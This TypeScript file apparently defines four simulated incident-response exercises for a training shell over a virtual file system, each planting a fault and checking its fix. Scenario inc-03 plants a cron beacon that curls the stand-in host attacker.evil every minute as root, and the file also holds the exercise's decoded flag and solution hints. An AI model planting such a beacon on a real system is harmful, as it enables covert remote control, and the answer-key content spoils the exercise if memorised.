import type { VirtualFileSystem } from '../vfs/fileSystem';
import { getSysAdminState, saveSysAdminState } from '../shell/commands/sysadmin';
import { getUfwState, saveUfwState } from '../shell/commands/security';

export interface IncidentScenario {
  id: string;
  title: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  category: string;
  symptom: string;
  description: string;
  faultDescription: string;
  resolutionHint: string;
  deployFault: (vfs: VirtualFileSystem) => void;
  verifyResolution: (vfs: VirtualFileSystem, history: string[]) => { resolved: boolean; message: string };
}

export const INCIDENTS: IncidentScenario[] = [
  {
    id: 'inc-01',
    title: 'Production Web Outage (HTTP 502 / Connection Refused)',
    severity: 'Critical',
    category: 'Web & Firewall',
    symptom: 'curl http://webapp.local fails with "Connection refused"',
    description: 'Customers report that the internal production web portal is completely down.',
    faultDescription: 'Stops nginx daemon, injects a firewall DENY rule on port 80, and removes webapp.local from /etc/hosts.',
    resolutionHint: '1) sudo systemctl start nginx\n2) sudo ufw allow 80 (or sudo ufw disable)\n3) Add "127.0.0.1 webapp.local" to /etc/hosts',
    deployFault: (vfs: VirtualFileSystem) => {
      // 1. Stop nginx
      const sys = getSysAdminState();
      if (sys.services.nginx) sys.services.nginx.status = 'stopped';
      saveSysAdminState(sys);

      // 2. Add DENY rule in UFW
      const ufw = getUfwState();
      ufw.enabled = true;
      ufw.rules = ufw.rules.filter(r => r.port !== 80);
      ufw.rules.push({ id: 99, port: 80, proto: 'tcp', action: 'DENY', from: 'Anywhere' });
      saveUfwState(ufw);

      // 3. Remove webapp.local from /etc/hosts
      const hostsNode = vfs.getNode('/etc/hosts', true);
      if (hostsNode?.content) {
        const cleaned = hostsNode.content.split('\n').filter(l => !l.includes('webapp.local')).join('\n');
        vfs.writeFile('/etc/hosts', cleaned);
      }
    },
    verifyResolution: (vfs: VirtualFileSystem) => {
      const sys = getSysAdminState();
      if (sys.services.nginx?.status !== 'running') {
        return { resolved: false, message: 'nginx daemon is still stopped. Start it via systemctl.' };
      }

      const ufw = getUfwState();
      if (ufw.enabled && ufw.rules.some(r => r.port === 80 && r.action === 'DENY')) {
        return { resolved: false, message: 'Port 80 is still blocked by UFW firewall.' };
      }

      const hostsNode = vfs.getNode('/etc/hosts', true);
      if (!hostsNode?.content?.includes('webapp.local') || !hostsNode.content.includes('127.0.0.1')) {
        return { resolved: false, message: 'webapp.local is not mapped to 127.0.0.1 in /etc/hosts.' };
      }

      return { resolved: true, message: 'Success! Web server restored and resolving correctly.' };
    },
  },

  {
    id: 'inc-02',
    title: 'Disk Exhaustion & Locked Projects Directory',
    severity: 'High',
    category: 'Storage & Permissions',
    symptom: 'Spam log consumes storage and ~/projects throws "Permission denied"',
    description: 'An unmonitored debug process saturated disk space, and misconfigured permissions locked developers out.',
    faultDescription: 'Creates /var/log/runaway.log and revokes all permissions (000) on /home/user/projects.',
    resolutionHint: '1) rm -f /var/log/runaway.log\n2) chmod 755 /home/user/projects',
    deployFault: (vfs: VirtualFileSystem) => {
      let spam = '';
      for (let i = 0; i < 50; i++) {
        spam += `[RUNAWAY_PROCESS_DEBUG] Memory block ${i} leaked. Retrying connection to dead backend...\n`;
      }
      vfs.writeFile('/var/log/runaway.log', spam);

      const proj = vfs.getNode('/home/user/projects', false);
      if (proj) proj.permissions = '---------';
    },
    verifyResolution: (vfs: VirtualFileSystem) => {
      const logNode = vfs.getNode('/var/log/runaway.log', false);
      if (logNode) {
        return { resolved: false, message: '/var/log/runaway.log still exists. Delete it with rm.' };
      }

      const proj = vfs.getNode('/home/user/projects', false);
      if (!proj || !proj.permissions.includes('r') || !proj.permissions.includes('x')) {
        return { resolved: false, message: '/home/user/projects permissions are still locked. Restore with chmod 755.' };
      }

      return { resolved: true, message: 'Success! Space reclaimed and permissions restored.' };
    },
  },

  {
    id: 'inc-03',
    title: 'Compromised Backdoor & Forensics Investigation',
    severity: 'High',
    category: 'Security & Forensics',
    symptom: 'Unauthorized cron task detected and suspicious payload dropped in /tmp',
    description: 'Security operations flagged anomalous beaconing activity originating from cron.',
    faultDescription: 'Plants an unauthorized cron entry in /etc/crontab and drops an obfuscated base64 artifact in /tmp/.hidden_payload.b64.',
    resolutionHint: '1) Decode /tmp/.hidden_payload.b64 with base64 -d into ~/forensics_flag.txt\n2) Remove the attacker.evil line from /etc/crontab',
    deployFault: (vfs: VirtualFileSystem) => {
      vfs.writeFile(
        '/tmp/.hidden_payload.b64',
        'U0VDUkVUX0ZMQUd7ZjByM25zMWNzX200c3Qzcl8yMDI2fQ==\n'
      );

      const crontabNode = vfs.getNode('/etc/crontab', true);
      const cur = crontabNode?.content || '';
      if (!cur.includes('attacker.evil')) {
        vfs.writeFile('/etc/crontab', cur + '\n* * * * * root curl -s http://attacker.evil/beacon\n');
      }
    },
    verifyResolution: (vfs: VirtualFileSystem) => {
      const flagNode = vfs.getNode('/home/user/forensics_flag.txt', true);
      if (!flagNode?.content?.includes('SECRET_FLAG{f0r3ns1cs_m4st3r_2026}')) {
        return { resolved: false, message: '~/forensics_flag.txt does not contain the decoded secret flag.' };
      }

      const crontabNode = vfs.getNode('/etc/crontab', true);
      if (crontabNode?.content?.includes('attacker.evil')) {
        return { resolved: false, message: '/etc/crontab still contains the unauthorized attacker beacon.' };
      }

      return { resolved: true, message: 'Success! Forensics artifact extracted and cron cleaned.' };
    },
  },

  {
    id: 'inc-04',
    title: 'Database Corruption & Point-In-Time Disaster Recovery',
    severity: 'Critical',
    category: 'Database & Recovery',
    symptom: 'sqlite3 /var/lib/app.db fails with corrupted database error',
    description: 'A power surge corrupted the active application database header.',
    faultDescription: 'Corrupts /var/lib/app.db header and verifies clean archive in /var/backups/db_backup.tar.gz.',
    resolutionHint: '1) tar -xzvf /var/backups/db_backup.tar.gz (or restore from backup)\n2) sqlite3 /var/lib/app.db "SELECT * FROM employees;" > ~/db_recovered.txt',
    deployFault: (vfs: VirtualFileSystem) => {
      vfs.writeFile('/var/lib/app.db', 'CORRUPT_HEADER_INVALID_DB_BINARY_STREAM\x00\x00\xFF');
    },
    verifyResolution: (vfs: VirtualFileSystem) => {
      const dbNode = vfs.getNode('/var/lib/app.db', true);
      if (!dbNode?.content || !dbNode.content.includes('employees') || !dbNode.content.includes('Linus Torvalds')) {
        return { resolved: false, message: '/var/lib/app.db is still corrupted or missing the employees table.' };
      }

      const recNode = vfs.getNode('/home/user/db_recovered.txt', true);
      if (!recNode?.content || !recNode.content.includes('Linus Torvalds')) {
        return { resolved: false, message: '~/db_recovered.txt does not contain query output from restored database.' };
      }

      return { resolved: true, message: 'Success! Database fully recovered and verified.' };
    },
  },
];
